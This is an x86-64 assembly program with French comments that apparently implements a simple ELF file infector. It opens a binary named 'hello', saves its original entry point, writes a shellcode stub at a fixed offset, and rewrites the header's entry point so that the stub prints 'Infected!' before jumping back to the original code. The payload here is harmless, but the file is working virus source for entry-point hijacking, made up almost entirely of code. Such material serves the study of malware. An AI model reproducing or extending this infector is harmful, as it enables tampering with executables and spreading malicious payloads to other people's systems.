section .data
    filename db "hello", 0
    new_entry dq 0x1180        ; Juste après la fin du segment .text
    orig_entry dq 0

section .text
    global _start

shellcode:
    ; Sauvegarde du contexte complet
    push rax
    push rbx
    push rcx
    push rdx
    push rsi
    push rdi
    push rbp
    push r8
    push r9
    push r10
    push r11
    push r12
    push r13
    push r14
    push r15

    ; Affiche "Infected!"
    mov rax, 1              ; syscall: write
    mov rdi, 1              ; stdout
    lea rsi, [rel msg]      ; Adresse du message
    mov rdx, 9              ; Longueur du message
    syscall

    ; Restauration du contexte
    pop r15
    pop r14
    pop r13
    pop r12
    pop r11
    pop r10
    pop r9
    pop r8
    pop rbp
    pop rdi
    pop rsi
    pop rdx
    pop rcx
    pop rbx
    pop rax

    ; Calcul de l'adresse de base (pour PIE)
    call get_base
get_base:
    pop rbx                ; RBX = adresse actuelle
    sub rbx, get_base - shellcode  ; Retour au début du shellcode
    sub rbx, 0x1180        ; Ajustement pour obtenir la base du programme

    ; Prépare le contexte pour _start
    xor rbp, rbp           ; Clear RBP comme _start s'attend
    push rbp               ; Stack frame propre
    mov rbp, rsp           ; Setup frame pointer

    ; Calcul de l'adresse de _start et jump
    mov rax, rbx           ; Base du programme
    add rax, [rel entry_offset]  ; Ajoute l'offset de _start
    xor rcx, rcx           ; Clear des registres pour _start
    xor rdx, rdx
    jmp rax                ; Jump à _start

msg db "Infected!", 0xa, 0
entry_offset dq 0x1060     ; Offset original de _start
shellcode_end:
    shellcode_len equ shellcode_end - shellcode

_start:
    ; Ouverture du fichier ELF
    mov rax, 2              
    lea rdi, [rel filename]
    mov rsi, 2              ; O_RDWR
    xor rdx, rdx
    syscall
    test rax, rax
    js exit_error
    mov r8, rax             

    ; Lire l'entry point original
    mov rax, 8              ; lseek
    mov rdi, r8
    mov rsi, 24             ; Offset de l'entry point
    xor rdx, rdx
    syscall

    ; Sauvegarder l'entry point original
    mov rax, 0              ; read
    mov rdi, r8
    lea rsi, [rel orig_entry]
    mov rdx, 8
    syscall

    ; Écrire le shellcode à la fin du segment LOAD exécutable (après 0x1175)
    mov rax, 8              ; lseek
    mov rdi, r8
    mov rsi, 0x1180        ; Nouvelle position après le code existant
    xor rdx, rdx
    syscall

    mov rax, 1              ; write
    mov rdi, r8
    lea rsi, [rel shellcode]
    mov rdx, shellcode_len
    syscall

    ; Mettre à jour l'entry point
    mov rax, 8              ; lseek
    mov rdi, r8
    mov rsi, 24             ; Offset de l'entry point dans l'en-tête
    xor rdx, rdx
    syscall

    mov rax, 1              ; write
    mov rdi, r8
    lea rsi, [rel new_entry]
    mov rdx, 8
    syscall

    ; Fermeture propre
    mov rax, 3              ; close
    mov rdi, r8
    syscall

    jmp exit_success

exit_error:
    mov rax, 60             ; exit
    mov rdi, 1              ; avec erreur
    syscall

exit_success:
    mov rax, 60             ; exit
    xor rdi, rdi            ; succès
    syscall